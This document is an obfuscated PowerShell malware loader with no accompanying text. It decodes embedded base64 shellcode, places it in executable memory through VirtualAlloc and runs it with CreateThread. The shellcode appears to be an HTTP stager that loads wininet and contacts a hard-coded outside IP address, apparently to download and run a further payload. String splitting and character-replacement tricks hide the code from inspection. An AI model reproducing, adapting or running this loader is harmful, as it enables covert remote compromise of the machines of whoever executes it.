& ( $eNv:cOmspEc[4,24,25]-JoiN'')( ('Set-StrictMode -Version 2
'+'
U07DoIt = @Sbv
fu'+'nction f'+'unc_get_proc_addr'+'ess {
'+'     Param (U07var_module, U07var_procedure)
        U07var_unsafe_native_methods = ([Ap'+'pDomain]::CurrentDomain.Get'+'Assemblies() 6sr Where-Object { U07_.GlobalAssemblyCache -And U07_.Location.Split(SbvslJslJSbv)[-1].'+'Equals(SbvSystem.dllSbv)'+' }).GetType(Sbv'+'Microsoft'+'.Win32.UnsafeNativeMethodsSbv)

        return U07var_unsafe_nativ'+'e_methods.GetMethod(SbvGetProcAddressSbv).Invoke(U07null, @(['+'System.Runtime.InteropServices.HandleRef](New-Objec'+'t System.Runtime.InteropServi'+'ces.Handle'+'Ref((New-Object IntPtr), (U07var_unsafe_native_methods.GetMethod(SbvGetModuleHandleSbv)).Invoke(U07null, @(U07var_module)))), U07var_procedure))
}

function func_get_delegate_type {
        Param (
                [Parameter(Position = 0, '+'Mandatory = U07T'+'rue)] [Type[]] U07var_parameter'+'s,
                [Paramet'+'er(Positi'+'on ='+' 1)] [Type] U07var_return_type = [Void]
        )

        U07var_type_builder = [AppDomain]::CurrentDomain.DefineD'+'ynamicAssembly((New-Object System.Reflection.AssemblyName(SbvReflectedDelegateSbv)), [S'+'ystem.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(SbvInMemoryModuleSbv, U07false).DefineType(SbvM'+'yDelegateTypeSbv, SbvClass, Public, Sealed, Ans'+'iClass, AutoC'+'lassSbv, [System.Multicast'+'Delegate])
        U07var_type_builde'+'r.DefineConstructor(SbvRTSpecialName, HideBySig, PublicSbv, [System.Reflection.CallingConventions]::Standard, U07var_parameters).SetImplementationFlags(SbvRuntime, ManagedSbv)
        U07var_type_builder.DefineMethod(SbvInv'+'okeSbv, SbvPublic, HideBySig, NewSlot, V'+'irtualSbv, U07va'+'r_return_type'+', U07var_p'+'arameter'+'s).SetImplementationFlags(SbvRuntime, ManagedSbv)

        return U07var_type_builder.CreateType()
}

[Byte[]]U07var_code = [System.Convert]::FromBase64String(KYp/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH'+'/McCsPGF8Aiwgwc8NAcfi8F'+'JXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kd'+'eJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6IAAAABNb3ppbGxhLzUuMCAoV2lu'+'ZG93cyBOVCA2LjE7IFdPVzY0OyBU'+'cmlkZW50LzcuM'+'DsgcnY6MTEuMCkgbGlrZSBHZWNrbwBYWF'+'hYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYAFkx/1d'+'XV1dRaDpWeaf/1emTAAAAWzHJUVFqA1FRaAUNAABTUGhXiZ/G/9WJ'+'w+t6WTHSUmgAMqCEUlJSUVJQ'+'aOtVLjv/1YnGaIAzAACJ4GoEUGofVmh1Rp6G/9Ux/1dXV1dWaC0GGH'+'v/1YXAdEgx/4X2dASJ+esJaKrF4l3/1YnBaEUhXjH/1TH/V2oHUVZQaLdX4Av/1b8ALwAAOcd1BInY64o'+'x/+sV60nogf///y9TZFpLAABo'+'8LWiV'+'v/VakBoABAAAGgAAEAAV2hYpFPl/9WTU1OJ51doACAAAFNWaBKWieL/1YXAdM2LBwHDhcB15VjD6B3///8xOTIuMTU0LjIyNC41NwA=KYp)

U07var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegate'+'ForFun'+'ctionPointer((func_get_proc_address kernel32.dll Virtua'+'lAlloc)'+', (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]:'+':Zero, U07var_code.Length,0x3000, 0x40)
[System.Runtim'+'e.InteropServices.Marshal]::Copy(U07var_code, 0, U07var_buffe'+'r, U07var_code.le'+'ngth)

U07var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(('+'func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]'+'))).Invoke([IntPtr]::Zero,0,U07var_buffer,[IntPtr]::Zero,'+'0,[IntPtr]::Zero)
[System.Runtime.Inter'+'opServices.Marshal]::Ge'+'tDelegateForFunctionPointer((func_get_proc_address '+'kernel32.dll W'+'aitForSingleObject), (func_get_delega'+'te_type @([IntPtr], [Int32]))).Invoke(U07var_hthread,0xfffff'+'fff) 6sr Out-Null
Sbv@

If'+' ([IntPtr]::size -eq 8) {
        star'+'t-job { param(U07a) IEX U07a } -RunAs32 -Argument U07DoIt 6sr wait'+'-job 6sr Receive-Job
}
else {
        IEX'+' U07DoIt
}
').replaCE('slJ',[StRING][CHAR]92).replaCE(([CHAR]83+[CHAR]98+[CHAR]118),[StRING][CHAR]39).replaCE('U07','$').replaCE(([CHAR]75+[CHAR]89+[CHAR]112),[StRING][CHAR]34).replaCE(([CHAR]54+[CHAR]115+[CHAR]114),'|'))
